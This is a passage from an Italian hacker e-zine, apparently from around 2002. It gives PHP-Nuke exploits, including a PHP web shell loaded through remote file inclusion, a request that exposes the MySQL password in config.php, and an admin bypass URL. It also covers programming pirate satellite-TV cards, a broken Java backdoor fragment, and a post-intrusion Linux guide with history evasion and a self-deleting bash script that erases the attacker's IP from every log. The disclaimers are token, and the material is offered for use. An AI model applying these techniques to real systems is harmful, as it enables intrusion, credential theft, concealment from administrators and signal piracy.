- Cioda, (non è proprio il suo nome... :-)
- IceAgitter^One,
- Kain, Ascii e tutti gli altri della crew che c'erano allo smau (kuht + ush
  dev team = esoh),
- emanuele, (quel pippomane di kocaine.net)
- observer, (hai vinto il premio del mailer n°1: contento? :-D )
- tutti quelli di cui mi sono (involontariamente :-) scordato: scusatemi!

aspettando i vostri feed-back vi saluto.
          pex3@fuckwindows.com

----------------------------------------------------------------- The End. --

Post Scriptum:
Volevo parlarvi del servizio di email forwarding offerto dal sito:

  www.fuckwindows.com

è gratuito e consiste in un semplice redirect verso la vostra casella di
email vera e propria ;-) per intenderci è tipo un cjb.net delle email, ma
con il vantaggio che non viene codata nessuna pubblicità e poi.... volete
paragonare un indirizzo come @hotmail.com, @virgilio.it, @libero.it, ecc...
con account tipo @fuckwindows.com, @windows-sucks.com e molti altri contro
billgates, microsoft e windows??? ma dico... ;-P
vabbè anche se non vi fate questo account fuckate allo stesso microsoft:
infondo è questo ciò che conta ;-) ciò che conta è liberarsi da un monopolio
oppressante e ingiusto, oltre che lento, pieno di bug, proprietario e
instabile :-)
UNIX: LIVE FREE OR DIE!

------------------------------------*END*--------------------------------------

-------------------------------------[5]---------------------------------------
---------------------------------[ [V]lad ]------------------------------------
----------------------------[PHP-Nuke Exploits]--------------------------------


            ______________________________________________
\          |                                               |
  \	   |      PHP-NUKE EXPLOIT & VULNERABILITIES       |
    \------|                                               |
	   |                   BY [V]lad                   |
	   \_______________________________________________/

\\\\\\\\\\\\\\\\\\\\\\\\\\
 DESCLAIMER
\\\\\\\\\\\\\\\\\\\\\\\\\\
|-------------------------------------------------------------------------------
| Questo articolo è stato scritto per puri scopi informativi e per PREVENIRE   |
| attacchi informatici. L'autore nn prende alcuna responsabilità per l'uso     |
| sconsiderato od improprio delle informazioni contenute in queso file. Il     |
| possesso di questo documento nn è illegale. Utilizzarlo per scopi illegali...|
| lo è(bana-gelato)                                                            |
|-------------------------------------------------------------------------------

///////////////////////
INTRODUZIONE
///////////////////////
Ciao a tutti!!!! Vedo con piacere che vi interessano le vulnerabilità del PHP-NUKE
...fate bene... fate bene.... Infatti codesto (wow che paroloni) tool è molto diffuso
nel web! Per nostra fortuna è pure particolarmente buggato! UAZ UAZ! In questo tute
capirete come sfruttare le vulnerabilità per avere la wwwroot... o cmq passwd di
utenti comandi arbitrari exx exx

///////////////////////////////
SOTTO CON GLI EXPLOIT!!!!!!!
///////////////////////////////
                                           /---------\
Allora... da dove posso iniziare?? Ma si..| index.php | andrà benissimo!!!!!
                                           \ --------/
Dovete sapere che l'exploit che andò ad analizzare:
1)sfrutta lo script "index.php"
2)E' remoto(Evvai!)
3)Dovrebbe (a meno che nn sia pachati) funzionare su PHP-NUKE 5.3.1 e precedenti

Tutto nasce dal fatto che lo script "index.php" ha un'implementazione che permette
ad un utente di "includere" un file. Grazie all'irresponsabilità dei programmatori
è possibile "includere" file che provengono anche da un server remoto! E cosa pensate
che succederebbe se includessimo uno scriptuccio carino carino? Ovviameente verrebbe
eseguito con i permessi del wwwroot! Questo nn ci permettarà certo di avere una shell
(o meglio: nn subito;) ma un buon deface(urk! nn fatelo mai) nn ce lo leva nessuno!!
COSA COSA? Non conoscete il php e quindi nn sapete fare lo script? Bhè basta creare
un file... non so... expl.php, ci scrivete dentro:

/----CUT HERE---------------
<?php
system($cmd);
?>
\----CUT HERE---------------

E lo upplodate sul vostro server preferito. Dopodichè da browser basterà fare:

http://server-vittima/index.php?file=http:/
/il.server.dove.avete.messo.lo.script/expl.php&cmd=il.comando.che.volete

Bello no? ehehe si abbastanza!

Bene... Direi di proseguire con un'altro bell'exploit: vi piacerebbe avere la
 /----------------\
| passwd del mysql | ?? Da browser fate :
 \----------------/
http://www.server.net/admin.php?upload=1&file=config.php&file_name=hacked.txt&wdir=
/images/&userfile=config.php&userfile_name=hacked.txt

E poi
     http://www.server.net/images/hacked.txt

In questo modo leggerete il file config.php che contiene la passwd del mysql!!
Check it OUT!
Ovviamente potete quindi LEGGERE QUALSIASI file nell'http server... nn male eh?
Sono affetti da questo bug le versioni precedenti alla 5.2 (compresa) tranne la
5.0 RC1... ameno che nn siano pachate!

Il prossimo è un bug alquanto vecchio in quanto funziona esclusivamente sulla
versione 2.5 e precedenti... E' dovuto ad un gravissimo errore di programmazione
e consiste solamente nel fare da browser: http://target/admin.php3?admin=any_data
per ottenere i privilegi admin!

OK! Direi che ho finito... i bug analizzati nn sono molti(ok sono 3) ma sono
davvero buoni!! Ulteriori documentazioni le trovate su www.securityfocus.com

Asta la vista, Baby!!!!!!!!

//////////////////////////////
CREDITS
//////////////////////////////
Ringrazio e saluto TUTTA la #NoFlyZone!!!!! Ci trovate su
irc.azzurra.net -> #NoFlyZone

Saluti speciali a: LordVicio, Crashes, CityHunter, pex3, Rippy, KamorraBoy
                   Zukky, format, bartx, e TUTTI quelli che ho dimenticato

FuckSpeciali a : TUTTI i miei prof., la TelecoZ, berlusconi(nn merita la
                 lettera maiuscola sul nome), e tutti i bambini cattivi!!!


                               --------------------------------
                               |        [V]lad - #NoFlyZone   |
                               |          copyright 2002      |
                               --------------------------------

------------------------------------*END*--------------------------------------

-------------------------------------[6]---------------------------------------
---------------------------------[ [V]lad ]------------------------------------
----------------------------------[H@ckS@t]------------------------------------

<-_->*<-_->*<-_->*<-_->*<-_->* H@ckS@t How To by<-_->*<-_->*<-_->*<-_->*<-_->*
<-_->*<-_->*<-_->*<-_->*<-_->*<-_->*[V]lad<-_->*<-_->*<-_->*<-_->*<-_->*<-_->*


Desclaimer:
Questo tutorial è da utilizzarsi unicamente a scopo didattico e teorico nei paesi
dove è previsto il pagamento per vedere la televisione via satellite... l'italia
è fra uno di questi quindi o andate a vivere in Alaska o vi comprate un abbonamento!
;)

Materiale utilizzato:
Bene bene..... volete programmare una wafer con codici seca o irdeto??? Ecco cosa
vi serve se avete un decoder goldbox(suppongo anche per gli altri ):

1 Programmatore tipo ludipipo o multipipo per i chip 24c16 e 16f84 con uno slot
  per la wafer card. Prezzo a partire dalle 30 euro in un negozio di elettronica
2 W@fer C@rd con i chip 16f84 e 24c16. dalle 10 euro in su in un negozio di
  elettronica
3 Software PIC24c13(ne esistono moltissimi per programmare wafer... io mi trovo bene
  con questo) che trovate in giro per la rete con google o yahoo

Bene...avete tutto? si parte....

1 Scaricate i codici sec@ e metteteli nella stessa cartella del software pic

2 collegate il ludipipo alla com1 del pc e alimentatelo con una normale 9volt

3 ora togliete con un cacciavite a punta finissima SOLO l'eeprom 24c16 dalla w@fer.
  FATE ATTENZIONE A NN PIEGARE I PIEDINI!!

4 inserite la w@fer nel ludipipo e fate partire il software pic24c13

5 a sto punto: |device->16f84|, |options->ludipipo->com1->TestHardware| e premete
  invio,|picsettings->osctype| le opzioni nella nuova finestra devono essere così:
  NO, NO, NO, XT se nn lo sono cambiatele voi! e poi |action->erasepic|

6 a questo punto siete pronti: |load->file hex| e caricate il file hex... a volte
  tutti e due i file sono .hex...:( dovete  quindi caricare quello chiamato
  "<qualcosa> pic <qualcosa>" per progammare |action->program|

7 ora estraete la w@fer e mettete nel ludipipo solo l'eeprom(quello ke avete tolto
  prima) Attenzione: questo nn va inserito nella w@fer in fase di programmazione!
  facendo attenzione al verso (capite il verso grazie ad una piccola cavità nel chip
  ke va messa in corrispondenza a quella dello slot)... ora passiamo alle operazioni
  con il software

8 |device->24c16| e poi |File->loadBin|(in alcuni casi è anche questo .hex...nn
  importa caricatelo) ed infine |action->program|!

Ricordate ke i codici dovrete aggiornarli ogni mese + o meno... ma se siete fortunati
in rete li trovate pure autoaggiornanti e antireset! check it out!

Bene ora avete finito.... siete solo meno ignoranti e nn con + soldi perchè ricordate
che in italia è illegale fare h@cks@t!!!!!!!!! se nn avete capito qualcosa nn esitate
chiedermelo in chan!

irc server : irc.azzurra.it
irc channel: #noflyzone
nfz url: www.noflyzone-crew.cjb.net

------------------------------------*END*--------------------------------------

-------------------------------------[7]---------------------------------------
---------------------------------[ Crashes ]-----------------------------------
---------------------------[Creare una Backdoor #3]----------------------------

we,we,we, gente eccolo qui, il terzo ed ultimo tutozz, per il backdoor in Java,
partiamo subito ma prima mettiamo su un pò di musica okz, dehehe, k, si parte.....
				*/\* NoflyZone Crew */\*
allora, partiamo subito subito, senza perdere tempo, questa è la parte ke mancava
ed è anke la + significativa, il plugin elemnto essenziale per far funzionare sta
benedetta Backdoor......
-----------------------------------++++++++-------------------------------------

pubblic class WindowsPlugIn {
public void run() {
Frame PLugInFrame=newFrame ("Salve come va?")
plugInFrameset Size(256,64);
plugInFrame.set Visible(true);
//qui inizia il divertimento
	}
}

Ricordatevi di Come avevate salvato il client adesso per fare un test :
java (nomeclinet) localHost (porta) file:(plugIn)

Chiaro è, ke il PLugIn, può essere modificato a Vs piacimento, ma l'importante è
usare i giusti parametri, e riflettere su quello che cmq deve fare il Backdoor...
ricodatevi di salvare

SALUTI: alla crew, al chan #NoFlyZone #Warez-Planet in particolare a /\ LordVicio /\
/\LoNeWoLfDeN /\/\ /\/\Cristian84 /\/\ DArklines /\/\  BigaLex /\/\ Marsio /\
/\ [D]kl /\/\ Lord_Ark /\/\

			********** www.noflyzone-crew.cjb.net **********
		********** irc: irc.azzurra.it 6667 #NoFlyZone **********
	****** irc: irc.arkshrine.serveirc.com 6667 #NoflyZone #FuoriDiTesta ******
			 _____________________________________ 
			[                                     ]
			[          Copyright (C) 2001         ]
			[                                     ]
			[    Crashes  - rocket@freemail.it    ]
			[_____________________________________]


------------------------------------*END*--------------------------------------

-------------------------------------[8]---------------------------------------
----------------------------------[Ov3rSYS]------------------------------------
---------------------[OPERAZIONI DALL'INTERNO DI UNA LINUX]--------------------


                 3333
                   3
  ******  v   v  333 r r  /
 *      *  vvv     3 rr  /
*  /--\  *  v  3333  r  /
* (    ) *  -----------/
*  \--/  * /(SS   (SS
 *      * /  \ y y \
  ****** /  SS) y SS)   Ov3rSyS Lab. Presenta

--------------------------------------------------------------------------------

OPERAZIONI DALL'INTERNO DI UNA LINUX
Una produzione dell' Ov3rSyS Lab. mantenuto da Ov3rSyS.

--------------------------------------------------------------------------------

INDICE
- Disclaimer
- Info extra
- Operazioni dall'interno di una linux

-------------------------------------------------------------------------------

- Disclaimer

Io Ov3rSyS affermo con sincerità che questa guida è a puro scopo informativo, per
rendere gli amministratori di sistemi consapevoli dei pericoli a cui possono essere
soggetti e delle metodologie utilizzate da persone maliziose che vogliono ottenere
un accesso a tali sistemi. Quindi non mi ritengo responsabile di qualsiasi
utilizzo illecito del materiale qui fornitovi. In poche parole tu lettore sei l'unico
responsabile di ciò che farai dopo aver appreso queste informazioni.
Se accetti questo Disclaimer continua a leggere, altrimenti cancella immediatamente
questo file.

--------------------------------------------------------------------------------

- Info extra

Luogo: ho scritto questo tutorial sul pc di casa mia utilizzando la mia dolce SuSe.
Musica: mentre lo scrivevo, ho ascoltato "Mick Jagger-God gave me everything",
"Eagles-Hotel California",
"Marilyn Manson-Irresponsible hate anthem", "Queen-Another bites the dust",
"Andrea Fortuna-Trip" ed altre...

------------------------------------------------------------------------------

- Operazioni all'interno di una linux

Ok, finalmente eccoci. Questo tutorial vuole insegnarvi tutto quello che so su
ciò che bisongnerebbe fare quando si è all'interno di un server linux appena bucato
e si è root.
Diciamo per assurdo che abbiamo bucato il server fa-un.freddocane.it ed ora ci
troviamo in questa situazione
bash#
La prima cosa da fare è unsettare alcune proprietà (se così possono essere chiamate)
che ha l'utenza root, in modo da iniziare a evitare che le nostre mosse vengano
viste o peggio ancora salvate all'interno di file.
Questo si fa digitando "unset HISTFILE", "unset DISPLAY", "unset HISTLOG", "unset
REMOTEHOST", "unset REMOTEUSER". Per esempio unset HISTFILE fa si che la scrittura
del file di log .bash_history , che logga tutte le cose digitate in shell da
qualsiasi utente, presente nella directory home dello stesso, (in questo caso in
/root)* sia bloccata. Ora non dobbiamo credere che questi semplici comandi ci rendano
invisibile, perchè non è assolutamente vero, infatti le precauzioni da prendere per
non rimanere loggati all'interno della macchina sono ben altre. Comunque questi
comandi sarebbe buona cosa digitarli appena si entra/rientra sul
sistema così come segue.

bash# unset HISTFILE
bash# unset DISPLAY
bash# unset HISTLOG
bash# unset REMOTEHOST
bash# unset REMOTEUSER
bash#
*Nota: se siete l'user ov3r, tutto ciò che digitate in shell finirà nel file
.bash_history situato nella vostra directory home, probabilmente in /home/ov3r/
.bash_history (ma potrebbe anche essere un'altra la dir home!!!).
Bene, ora digitiamo il comando "id" per vedere se siamo realmente root, infatti
il comando id ci fa capire chi siamo sulla macchina

bash# id
uid=0(root) gid=0(root)  gruppi=0(root) [ed altra roba che non vi sto a scrivere]
bash#
ok, abbiamo visto che siamo root, ma cosa avremmo visto se non fossimo stati root?
bash# id
uid=500(ov3r) gid=100(users) gruppi=100(users) [ed altra roba che non vi sto a
scrivere]
bash#
in questo caso saremmo stati l'user ov3r. Ma c'è anche un altro comando per vedere
chi siamo, ed è il "whoami"
bash# whoami
root
bash#
e se siamo ov3r
bash# whoami
ov3r
bash#
Ora abbiamo capito chi siamo, e le cose che sto per dirvi si possono fare solo se
si è root, quindi se lo siete bene, altrimenti trovatevi un exploit locale per
divenire da user a root.
Dopo ciò digitiamo "w", che ci fa vedere se ci sono degli utenti sul sistema
bash# w
7:30pm  up  1:57,  1 user,  load average: 1.14, 1.00, 0.67
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
pippo    :0       console           5:34pm   ?     0.00s   ?     -     [utente pippo]
bash#
in questo caso l'utente presente sul sistema è solo 1 ed è pippo, e voi direte :-
Come mai è solo 1 se ci sono anche io qui dentro? Non dovrebbe vedersi anche
l'utente root cioè io? - semplicemente possono capitare
entrambi i casi, ovvero questo dipende dall'exploit che avete utilizzato per bucare,
poichè alcuni vi nascondono al w altri no, quindi in questo caso l'exploit ci ha
nascosti, e nel caso contrario oltre a pippo si vedrebbe anche l'utente root cioè
noi. Quindi voi dovete controllare chi è loggato nella macchina, e potrebbe
capitare (dovete essere sfigati) che quando avete bucato il root sia presente quindi
potrebbe risultare ciò:

bash# w
7:30pm  up  1:57,  2 user,  load average: 1.14, 1.00, 0.67
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
root     *        console           *        ?     0.00s   ?     -      [root vero]
pippo    :0       console           5:34pm   ?     0.00s   ?     -      [utente pippo]
bash#
potrebbe anche succedere che l'exploit non vi renda invisibile al w e che quindi il
w riporti sia la vostra presenza, che la presenza del root vero (nel caso egli sia
loggato nella macchina), quindi vedrete una cosa
del genere...

bash# w
7:30pm  up  1:57,  3 user,  load average: 1.14, 1.00, 0.67
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
root     *        console           *        ?     0.00s   ?     -      [root vero]
root     *        console           *        ?     0.00s   ?     -      [voi]
pippo    :0       console           5:34pm   ?     0.00s   ?     -      [utente pippo]
bash#
quindi voi dovete controllare l'ora del login per vedere se il root che è loggato
dentro è il vero root oppure se siete voi. Ricordatevi che spesso l'admin non entra
come utente root sulla macchina, ma bensì come utente
normalissimo (come per esempio nei casi citati sopra potrebbe essere pippo!). Quindi
fate attenzione.
Se c'è il root la cosa migliore da fare sarebbe andarsene al più presto, ma non dopo
aver cancellato i vostri log (ora vi dirò come). Considerando che il root non ci sia,
e che ce la possiamo prendere con tutta calma, si dovrebbe fare
bash# cat /etc/issue
che fa vedere la versione e la distribuzione del sistema su cui stiamo "lavorando",
poi bash# cat /etc/hosts
per vedere la net di server in cui è situato il sistema su cui siamo, poi
bash# df -h
per vedere gli hardisk montati e lo spazio disponibile su di essi (è già capitato di
bucare un server con gli hardisk pieni zeppi che manco un rootkit ci stava :P) poi
potete fare bash# ps -aux
per vedere i processi attivi e capire che tipo di server è, poi
bash# netstat -autn
per vedere le porte aperte ma soprattutto per vedere se la vostra connessione al
server è visibile (il 100% dei casi). Ora bisogna crearsi una backdoor sul server
bucato, e questo lo si può fare in un infinità di modi
diversi, che si dividono principalmente in 3, ovvero l'installare un rootkit, farsi
una backdoor manualmente o sostituire qualche demone, ma questa parte la tralascio
perchè sennò dovrei scrivere un libro intero!
Vediamo piuttosto come dobbiamo fare per cancellarci dai log. Dobbiamo sapere che i
log di un sistema linux sono dei semplici files di testo che riportano la data ed
altre informazioni specifiche, come gli ip che hanno
utilizzato un determinato demone oppure come i comandi digitati in shell (che vanno
a finire nei .bash_history).
Effettivamente come molti dicono, la bravura di un hacker sta nel non farsi beccare,
e quindi nel cancellarsi dai log perfettamente. Ma questi log dove sono situati?
Sono situati in alcune directory di default che possono essere molte (/etc/log
/etc/ftp /tmp/log - /temp/var/log /var/run /var/log - /var/adm  /usr/log - /usr/adm
/log ) queste sono le principali, ma non è detto che i log siano solo qui, potrebbe
essere che il sysadmin abbia messo qualche log in qualche file sperduto in cartelle
poco comuni, ma solitamente i sysadmin non fanno nulla del genere a meno che non
siate nel server della Nasa o dell' Fbi (la nasa dicono che non sia poi così sicura
come le leggende metropolitane tramandino). Ora che sappiamo dove sono i log come
dobbiamo fare per cancellare le nostre tracce? Allora ci sono diversi metodi per
cancellarsi dai log...il più semplice è quello di usare un programmino come illusion
o come il t0rnsb che potete trovare facilmente nel web, però questi programmini
hanno il difetto di essere un po' datati e di non amare le eccezzioni, ma soprattutto
di odiare le distro linux differenti :), infatti loro cancellano i vostri log solo
da alcuni file.log già predefiniti, e non da tutti, anzi potrebbe essere che li
cancellino da tutti ma solamente perchè avete avuto culo e lo avete eseguito
su un os su cui si sono basati i creatori di questi programmini, quindi seguite i
miei consigli e fate come vi dico, che dovrebbe e dico dovrebbe essere uno dei metodi
migliori. Allora noi possiamo fare in 2 modi, il primo consiste nel togliere dai
files di log la presenza del nostro IP senza curarci di nulla, ovvero noi taglieremo
semplicemente via l'ip da ciascun file, e si può fare facendo come segue
bash# cd /var/log    [si va nella dir /var/log ; questo andrebbe fatto per tutte le
			directory citate sopra]
bash# ls -al         [si listano tutti i file della directory compresi quelli con
			un punto davanti al nome]
total 516
drwxr-xr-x   2 root     root         4096 Dec 16 17:15 .
drwxr-xr-x  18 root     root         4096 Nov 29 03:03 ..
-rw-r--r--   1 root     bin             0 Dec 15 19:02 boot.log
-rw-r--r--   1 root     bin             0 Dec  8 19:02 boot.log.1
-rw-r--r--   1 root     bin             0 Dec  1 19:02 boot.log.2
-rw-r--r--   1 root     bin          4092 Nov 29 09:48 boot.log.3
-rw-r--r--   1 root     bin          4108 Nov 22 02:32 boot.log.4
-rw-r--r--   1 root     bin         37822 Dec 19 22:01 cron
-rw-r--r--   1 root     bin         64153 Dec 15 19:02 cron.1
-rw-r--r--   1 root     bin         63476 Dec  8 19:02 cron.2
-rw-r--r--   1 root     bin         34317 Nov 30 14:40 cron.3
-rw-r--r--   1 root     bin         41726 Nov 22 08:40 cron.4
-rw-r--r--   1 root     bin          7659 Nov 29 09:48 dmesg
-rw-r--r--   1 root     bin             0 Nov 12 18:38 htmlaccess.log
-rw-r--r--   1 root     bin        146292 Dec 16 17:15 lastlog
-rw-r--r--   1 root     bin             0 Dec 15 19:02 maillog
-rw-r--r--   1 root     bin             0 Dec  8 19:02 maillog.1
-rw-r--r--   1 root     bin             0 Dec  1 19:02 maillog.2
-rw-r--r--   1 root     bin             0 Nov 24 19:02 maillog.3
-rw-r--r--   1 root     bin             0 Nov 17 19:02 maillog.4
-rw-r--r--   1 root     bin          4476 Dec 19 19:02 messages
-rw-r--r--   1 root     bin          5348 Dec 15 19:02 messages.1
-rw-r--r--   1 root     bin          3694 Dec  8 19:02 messages.2
-rw-r--r--   1 root     bin         36474 Dec  1 19:02 messages.3
-rw-r--r--   1 root     bin         36075 Nov 24 19:02 messages.4
-rw-r--r--   1 root     bin             0 Nov 30 19:02 netconf.log
-rw-r--r--   1 root     bin             0 Nov 12 18:38 netconf.log.1
-rw-r--r--   1 root     bin             0 Dec 15 19:02 secure
-rw-r--r--   1 root     bin             0 Dec  8 19:02 secure.1
-rw-r--r--   1 root     bin             0 Dec  1 19:02 secure.2
-rw-r--r--   1 root     bin            45 Nov 29 02:56 secure.3
-rw-r--r--   1 root     bin          8692 Nov 22 02:16 secure.4
-rw-r--r--   1 root     bin             0 Feb 17  2000 sendmail.st
-rw-r--r--   1 root     bin             0 Dec 15 19:02 spooler
-rw-r--r--   1 root     bin             0 Dec  8 19:02 spooler.1
-rw-r--r--   1 root     bin             0 Dec  1 19:02 spooler.2
-rw-r--r--   1 root     bin             0 Nov 24 19:02 spooler.3
-rw-r--r--   1 root     bin             0 Nov 17 19:02 spooler.4
-rw-r--r--   1 root     bin          1208 Dec 16 17:15 wtmp
-rw-r--r--   1 root     bin        104832 Dec 16 17:15 wtmp.1
-rw-r--r--   1 root     bin             0 Dec 15 19:02 xferlog
-rw-r--r--   1 root     bin             0 Dec  8 19:02 xferlog.1
-rw-r--r--   1 root     bin             0 Dec  1 19:02 xferlog.2
-rw-r--r--   1 root     bin             0 Nov 24 19:02 xferlog.3
-rw-r--r--   1 root     bin             0 Nov 17 19:02 xferlog.4
bash#
questo è quello che c'è su una "mia" Red Hat (a buon intenditore poche parole :P)...
voi direte :-minkiaaaa quanti- eggià,sono parecchi, e pensate che non sono neanche
tutti. Ora che sappiamo quali sono i files da controllare, dobbiamo procedere come

segue:
bash# cat cron | grep -v 123.4.5.6 > freddocane.tmp
bash# mv freddocane.tmp cron

vi spiego passo per passo cosa abbiamo fatto... con "cat cron" abbiamo detto a
linux di leggere il file cron, poi con "| grep -v 123.4.5.6" gli abbiamo detto di
togliere a quel file la stringa 123.4.5.6 in qualsiasi posto
essa sia presente (anche se è presente più volte), e con "> freddocane.tmp" gli
abbiamo detto di salvare il risultato nel file freddocane.tmp , ed infine abbiamo
rinominato il file freddocane.tmp in cron con il comando
"mv freddocane.tmp cron", quindi ora il file cron è stato truccato, ed al suo interno
non ci sono più i nostri log, e questa operazione bisogna farla per ciascun file in
questa directory e pure per i file nelle altre dir che vi ho citato sopra (se si teme
che l'admin sia abbastanza sveglio). Questo processo a mano può diventare
parecchio lungo e abbastanza snervante, quindi io ho preparato un bello script bash
che vi aiuterà nelle operazioni...quindi scrivete
bash# pico ov3r.sh
e se l'editor pico è presente vi troverete nel file ov3r.sh che è vuoto perchè lo
avete creato voi, ed oradovete scriverci dentro quanto segue

---------------------------------Taglia qui----------------------------------------
#!/bin/bash
IP="$1"
echo ""
echo "Ov3rSyS LogDeleter v1.0pub"
cd /var/log/
ls -1 > list.tmp
for files in `cat list.tmp`; do
cat $files | grep -v $IP > tmp.$$
mv tmp.$$ $files
done
rm -f list.tmp
cd
echo ""
echo ""
echo "Sto cancellando il tuo ip dai log..."
echo "Cancellato con successo il tuo ip $IP dai files in /var/log"
echo ""
rm -f $0
-----------------------------Taglia qui------------------------------------------
ora che lo avete scritto clikkate Ctrl+x e salvate, poi dovete scrivere
bash# chmod a+x ov3r.sh
che abilita il permesso di esecuzione del file, e poi lo eseguite scrivendo
bash# ./ov3r.sh 123.4.5.6      [123.4.5.6 naturalmente è il vostro ip]
così avrete cancellato il vostro ip da tutti i files presenti in /var/log/ , ma
chiaramente questo script è solo un assaggio, perchè se vi rompete il culo un po'
a studiacchiarvi il bash script language come ho fatto io, potrete farne qualcuno
che cancella i log molto migliore di questo, a voi sta la volontà di provare a farlo.
Se non ci riuscite potete contattarmi tramite mail all'indirizzo che metterò al fondo.
Ricordatevi che il pico potrebbe non esserci sul sistema bucato, e che quindi dobbiate
crearvi questo script sul vostro pc e poi metterlo in qualche ftp in modo da
potervelo scaricare sul sistema con tutta calma ogni qualvolta vogliate. Ricordatevi
che questo script si autocancella quando finisce il lavoro...la stringa
che lo fa cancellare è l'ultima, quindi se volete evitare che si autocancelli alla
fine del lavoro, dovete salvare lo script senza l'ultima riga.
Oltre al metodo che cancella direttamente il nostro ip dai file, ce n'è un altro che
consiste nel manomettere i files di log sostituendo il vostro ip ad un altro ip
scelto da voi, perchè ci sono alcuni programmini che
certi admin usano, che controllano costantemente la grandezza di questi file, così
se voi cancellate tutta quanta la riga dove si trova il vostro ip come si diceva
prima, succede che questi programmini se ne accorgono e di conseguenza se ne accorge
pure l'admin. Quindi noi sostituiremo il nostro ip con un ip formato dalla
stessa quantità di numeri per non alterare in alcun modo la grandezza del file, ovvero
se il nostro ip è il 123.4.5.6 noi lo potremo sostituire con un qualsiasi altro ip
formato allo stesso modo ***.*.*.* . Il problema che penso si ponga utilizzando
questo secondo metodo, è che se ci sono dei log strani l'admin si accorge che
qualcuno è entrato nel suo sistema, cosa che magari non capiterebbe se cancellassimo
completamente le stringhe con il nostro ip dentro; quindi lascio a voi l'iniziativa.
Questo secondo metodo è realizzabile tramite un corto bash script creato
appositamente che non vi scrivo sempre per il solito motivo che è bene non abituarsi
alla pappa pronta sempre (ma solo talvolta :P) e che bisogna impegnarsi per ottenere
dei risultati, quindi impegnatevi, e se non ce la fate c'è un indirizzo e-mail di
una persona ben disposta ad aiutarvi...cioè il mio!
NOTA BENE: Ricordatevi che per rendervi invisibili al netstat ed ad altre cose come
il w, avrete bisogno di modificare i suddetti programmi o di cambiarli con altri già
appositamente modificati, oppure vi installate un bel rootkit fatto bene che faccia
tutto, oppure ve lo fate voi un rootkit! E come? Beh, semplicemente prendendo
esempio dai rootkit che trovate in giro per la rete. Hum...sto pensando se ho
dimenticato qualcosa, ma mi pare di no, quindi ora rileggo e correggo gli errori di
ortografia, sempre se li riconosco :P!
Sì, una cosa l'ho dimenticata...dimenticavo di dirvi che per mettere qualche file
sul vostro sistema bucato potete utilizzare a grandi linee 3 metodi, o utilizzando
il "wget" che però su molti sistemi non è presente
bash# wget http://sito.qualsiasi.it/nomefiledascaricare.qualsiasicosa
oppure con il "lynx" con questa sintassi
bash# lynx http://sito.qualsiasi.it/nomefiledascaricare.qualsiasicosa
poi vi verrà chiesto se volete scaricare il file e voi dovrete digitare D e dopo
dovrete salvare il file, comunque è abbastanza semplice usarlo, tutt'alpiù fate
qualche prova dal vostro pc; oppure uploadando il file
tramite ftp, che sicuramente saprete come si utilizza, e che io sconsiglio vivamente,
dato che se usate l'ftp vi loggano in parecchi files.
Ora ho finito di rileggere, ed ho trovato e corretto un po' di errori, spero di
essere stato poco noioso ed esauriente, poi chiaramente posso aver scritto qualche
cazzata, perchè capita di fare anche quello :P, e
se ne trovate qualcuna degna di nota ditemelo via mail. Sono ben accetti
suggerimenti, iniziative, domande, consigli, ma soprattutto complimenti
:PPPP hihihihihihi ora vi saluto che son le 15:42 del 20/12 e mi connetto.

------------------------------------------------------------------------------

- Info mie

Ov3rSyS
E-MAIL: ov3r@2die4.com
IRC: contattatemi tramite e-mail e poi si vedrà


------------------------------------*END*--------------------------------------


-------------------------------------[9]---------------------------------------
----------------------------------[ R|Ppy ]------------------------------------
----------------------------[PASV mode e FlashFXP]-----------------------------

ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
³ PASV mode e FlashFXP ³
ÌÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍ¹
³ by R|Ppy º 21/11/2001³
ÈÍÍ³ÍÍÍ³ÍÍÍÊÍÍÍ³ÍÍÍÍ³ÍÍ¼


Software utilizzato: FlashFXP - www.flashfxp.com

- PASV mode

Tramite il PASV mode possiamo fare cose molto carine della serie noi ci
colleghiamo tramite client ftp ad un pub, poi successivamente utilizziamo la
finestra libera e clikkiamo sull'icona "switch to FTP browser" (e voi vi
domanderete endo sta? embe è l'ultima della fila della icon bar) e ci connet-
teremo ad un altro pub possilmente privato poi vi spiego il perche.

_ Schema di trasferimento dati


                       scambio
        Û               dati     Û
       ÚÄÄÄÄÄÄÄÄÄÄÄ¿            ÚÄÄÄÄÄÄÄÄÄÄ¿
       ³FTP origine³ Ä((ÄÄÄÄ))Ä ³FTP target³
       ÀÄÄÄÄÄÄÄÄÄÄÄÙ           /ÀÄÄÄÄÄÄÄÄÄÄÙ
                  \           /
                   \         /
                    nostro  /
                    client_/
                   °°°°°°°°

Pensate che con queste metodo voi potete entrare in un pub con accesso anonimo
e con l'altra task vi connettete ad un indirizzo privato di ftp e prendere i
files da uno e copiarli sull'altro senza usare la vostra banda.
Purtroppo non tutti gli ftp supportano la porta del PASV mode e quindi non è
sempre possibile sfruttare questo metodo :( (cmq tentar non nuoce).

Controlli e verifiche:

        - Supporto PASV mode dell'ftp tramite la stringa data al login dell'ftp
          (PASV MODE)

        - in questo caso sarebbe meglio disattivare l'utilizzo di proxy o socks
          per una migliore comunicazione tra i due ftp in remoto ( se avete dei
          proxy veloci potete pure tenerli).


Prima ho detto che sarebbe meglio utilizzare ftp privati, questo perche il 99%
di essi supportano il PASV ammeno che non sia stato disattivato sia in upload
che in download, cosa invece meno probabile se non rara nei PUB, possiamo trovar
spesso ftp anonimi che supportano il FXP method in download (upload del server)
ma viceversa (upload - download del server) è RARO visto che dalla versione 4.0
di microsoft ftp server il passive mode è disattivato di default, sarebbe una
mossa azzardata del SYSadmin attivare questa opzione.

Possiamo ora procedere alla fase di test.
Come detto prima facciamo i rispettivi login con le due sessioni di FlashFXP.
non dobbiamo fare altro che prendere i files da una parte, scegliere la director
di destinazione ed il gioco è fatto. Se questo metodo è supportato vedrete i fil
copiarsi da una parte all'altra in una fascia che oscilla dai 5 Kb/s (server len
a 20 / 50 Kb/s (server medi) a quelli piu veloci ( 200 / 500 Kb/s ).
Ovviamente per supportare velocità così elevate entrambi i server devono essere
veloci, non è che prendo i files da un super ftp e gli sbatto su un FTP privato
un mio amico (ADSL) e scarica a 500 KB/s ovvio no questo.
P.S. sto parlando di bytes per secondo non di bits ;)
Spesso sono gli ftp microsoft che supportano FXP ma possiamo trovare anche server
Unix molto veloci con il supporto in download / upload.


